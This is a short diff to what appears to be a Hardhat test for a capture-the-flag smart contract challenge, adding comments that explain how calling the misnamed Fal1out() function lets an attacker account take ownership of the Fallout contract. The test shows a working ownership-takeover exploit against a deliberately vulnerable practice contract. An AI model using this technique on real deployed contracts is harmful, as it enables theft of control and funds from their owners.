@@ -13,6 +13,8 @@ describe("Fallout contract exploit", () => {
   it("Should set attacker account as new owner", async () => {
     const { attacker, fallout } = await loadFixture(deployFalloutFixture);
 
+    // Call Fal1out() function 
+    // this will set attacker as the new owner
     await fallout.connect(attacker).Fal1out();
 
     const newOwner = await fallout.connect(attacker).owner();
